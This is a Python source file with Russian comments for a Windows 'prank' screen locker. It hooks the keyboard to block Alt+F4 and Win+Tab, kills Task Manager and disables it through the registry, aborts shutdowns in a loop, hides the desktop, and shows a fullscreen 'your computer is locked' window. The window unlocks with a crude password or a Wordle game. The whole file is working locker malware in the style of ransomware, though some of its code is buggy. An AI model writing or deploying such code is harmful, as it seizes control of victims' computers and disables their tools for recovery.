import tkinter as tk
from tkinter import messagebox
import win32gui
import win32con
import win32api
import ctypes
from ctypes import wintypes
import threading
import time
import os
import sys
import subprocess
from pynput import keyboard, mouse  # Для хуков клавиш

# Загаданное слово для Wordle
SECRET_WORD = "пенис".upper()

# Глобальные перемены
root = None
locked = True
wordle_window = None

# Low-level hook для блокировки клавиш (Alt+F4, Ctrl+Alt+Del и т.д.)
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Структура для хука
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]

# Callback для хука
def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode >= 0:
        if wParam == 0x0100:  # WM_KEYDOWN
            kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            vk = kb.vkCode
            # Блок Alt+F4
            if vk == 0x12:  # Alt
                if win32api.GetAsyncKeyState(0x73) & 0x8000:  # F4
                    return 1  # Блокируем
            # Блок Ctrl+Alt+Del
            if vk == 0x11 and win32api.GetAsyncKeyState(0x12) & 0x8000 and win32api.GetAsyncKeyState(0x2E) & 0x8000:  # Ctrl+Alt+Del
                return 1
            # Блок Win+Tab, Win+L и т.д.
            if vk == 0x5B or vk == 0x5C:  # Win key
                if win32api.GetAsyncKeyState(0x09) & 0x8000:  # Tab
                    return 1
            # Экстренная: Shift+0
            if vk == 0x30 and win32api.GetAsyncKeyState(0x10) & 0x8000:  # Shift+0
                global locked
                locked = False
                root.quit()
                return 1  # Но разблокируем в main
    return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

# Установка хука
hook_id = None
def install_hook():
    global hook_id
    CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    hook_proc = CMPFUNC(low_level_keyboard_proc)
    hook_id = user32.SetWindowsHookExW(win32con.WH_KEYBOARD_LL, hook_proc, kernel32.GetModuleHandleW(None), 0)

def uninstall_hook():
    global hook_id
    if hook_id:
        user32.UnhookWindowsHookEx(hook_id)

# Блокировка Task Manager и перезагрузки
def block_task_manager():
    # Убиваем taskmgr.exe
    subprocess.run(['taskkill', '/f', '/im', 'taskmgr.exe'], capture_output=True)
    # Блокируем через реестр (запрещаем запуск)
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    subprocess.run(['reg', 'add', reg_path, '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'], capture_output=True)
    # Блок перезагрузки: мониторим shutdown
    def monitor_shutdown():
        while locked:
            if subprocess.run(['shutdown', '/a'], capture_output=True).returncode == 0:  # Abort shutdown
                pass
            time.sleep(1)
    threading.Thread(target=monitor_shutdown, daemon=True).start()

# Скрытие рабочего стола
def hide_desktop():
    hwnd = win32gui.FindWindow("Progman", "Program Manager")
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

# Wordle игра
def start_wordle():
    global wordle_window
    if wordle_window:
        return
    wordle_window = tk.Toplevel(root)
    wordle_window.title("Wordle Prank")
    wordle_window.attributes('-fullscreen', True)
    wordle_window.configure(bg='black')
    wordle_window.attributes('-topmost', True)

    # Простая Wordle логика
    attempts = 6
    current_attempt = 0
    guesses = []

    def check_guess(guess):
        nonlocal current_attempt
        if len(guess) != 5:
            return
        color_map = []
        for i, letter in enumerate(guess):
            if letter == SECRET_WORD[i]:
                color_map.append('green')
            elif letter in SECRET_WORD:
                color_map.append('yellow')
            else:
                color_map.append('gray')
        guesses.append((guess, color_map))
        current_attempt += 1
        draw_board()
        if guess.upper() == SECRET_WORD:
            messagebox.showinfo("Победа!", "Угадал! Разблокировка...")
            unlock()
        elif current_attempt >= attempts:
            messagebox.showinfo("Проигрыш", f"Слово было {SECRET_WORD}. Разблокируй паролем!")

    def draw_board():
        for widget in wordle_frame.winfo_children():
            widget.destroy()
        for i, (guess, colors) in enumerate(guesses):
            row = tk.Frame(wordle_frame)
            row.pack()
            for j, (let, col) in enumerate(zip(guess, colors)):
                btn = tk.Button(row, text=let, width=4, height=2, bg=col if col != 'gray' else 'gray')
                btn.pack(side=tk.LEFT)

    def on_key(event):
        if event.keysym.isdigit() or event.keysym.isalpha():
            # Логика ввода (упрощённо, используй Entry)
            pass  # Добавь Entry для ввода

    wordle_frame = tk.Frame(wordle_window, bg='black')
    wordle_frame.pack(expand=True)
    draw_board()
    entry = tk.Entry(wordle_window, font=('Arial', 20), justify='center')
    entry.pack(expand=True)
    entry.bind('<Return>', lambda e: check_guess(entry.get()[:5]))
    wordle_window.bind('<Key>', on_key)
    wordle_window.focus_set()

# Разблокировка
def unlock():
    global locked
    locked = False
    uninstall_hook()
    # Восстанавливаем Task Manager
    subprocess.run(['reg', 'delete', r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", '/v', 'DisableTaskMgr', '/f'], capture_output=True)
    hide_desktop()  # Показываем обратно? Нет, но для разблокировки
    root.quit()
    sys.exit()

# Проверка пароля
def check_password():
    password = entry.get()
    if password.lower() == "пенис":
        unlock()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль!")

# Основное окно
def main():
    global root, entry
    install_hook()
    block_task_manager()
    hide_desktop()

    root = tk.Tk()
    root.title("Заблокировано")
    root.attributes('-fullscreen', True)
    root.configure(bg='red')
    root.attributes('-topmost', True)

    label = tk.Label(root, text="ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН!\nДля разблокировки введите пароль:", font=('Arial', 24), fg='white', bg='red')
    label.pack(expand=True)

    entry = tk.Entry(root, font=('Arial', 20), show='*', justify='center')
    entry.pack(pady=20)
    entry.bind('<Return>', lambda e: check_password())

    btn_wordle = tk.Button(root, text="Сыграть в Wordle (подсказка к паролю)", font=('Arial', 16), command=start_wordle, bg='blue', fg='white')
    btn_wordle.pack()

    btn_unlock = tk.Button(root, text="Разблокировать", font=('Arial', 16), command=check_password, bg='green', fg='white')
    btn_unlock.pack(pady=10)

    # Блокировка закрытия окна
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind('<Alt-F4>', lambda e: "break")
    root.mainloop()

if __name__ == "__main__":
    main()
